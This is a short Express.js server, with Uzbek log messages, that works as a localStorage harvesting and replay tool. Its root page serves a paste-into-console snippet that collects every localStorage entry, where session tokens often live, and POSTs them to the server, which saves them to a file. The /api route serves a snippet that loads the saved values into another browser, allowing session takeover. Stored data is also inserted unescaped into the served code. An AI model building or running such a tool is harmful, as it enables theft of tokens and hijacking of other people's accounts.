import Express from "express";
import cors from "cors";
import dotenv from "dotenv";
import fs from "fs";
import path from "path";

dotenv.config();

const app =  Express();

app.use(cors());
app.use(Express.json());
// app.use(bodyParser.json());
app.get("/",(req, res)=>{
    
  res.send(`
       <textarea>
       (async()=>{
  let myObject = {};

for (let i = 0; i < localStorage.length; i++) {
  let key = localStorage.key(i);
  let value = localStorage.getItem(key);
  myObject[key] = value;
}
  try{let backend = await fetch("http://localhost:3000/",
    {
      method:"POST",
      headers:{"Content-type":"application/json"},
      body:JSON.stringify(myObject)
       
    }

  );
  backend = await backend.json();
  console.log(backend)
}
  catch(err){
    console.log(err)
  }
})()
       </textarea>
      `);
});


app.post('/', (req, res) => {
    const data = req.body;
  
    const dataString = JSON.stringify(data);
    
    const filePath =  process.cwd() + 'data.txt';
    
    fs.writeFile(process.cwd() + "/filePath", dataString, (err) => {
      if (err) {
        console.error('Fayl saqlashda xatolik', err);
        res.status(500).send('Server Error');
        return;
      }
  
      res.status(200).send('Fayl saqlandi');
    });
  });

app.get("/api",(req,res)=>{
    fs.readFile(process.cwd() + "/filePath", 'utf8', (err, data) => {
        if (err) {
          console.error('Faylni saqlashda xatolik', err);
          return;
        }
        
        res.send(`
          <textarea>
    const myObject = (${data});
    for (let key in myObject) {
    if (myObject.hasOwnProperty(key)) {
    
      localStorage.setItem(key, myObject[key]);
    }
  }

          </textarea>
         `);
      

})})

app.listen(process.env.PORT,()=>{
    console.log("Server ishga tushdi", process.env.PORT)
});

